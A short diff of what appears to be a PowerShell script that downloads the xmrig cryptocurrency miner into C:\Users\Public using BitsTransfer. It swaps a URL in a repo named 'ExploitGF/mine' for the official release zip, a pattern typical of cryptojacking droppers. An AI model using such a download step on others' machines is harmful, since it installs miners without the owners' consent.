@@ -1,5 +1,5 @@
-$url = "https://github.com/ExploitGF/mine/raw/master/xmrig.exe"
-$output = "C:\Users\Public\xmrig.exe"
+$url = "https://github.com/xmrig/xmrig/releases/download/v2.6.4/xmrig-2.6.4-gcc-win64.zip"
+$output = "C:\Users\Public\xmrig.zip"
 $start_time = Get-Date
 
 Import-Module BitsTransfer
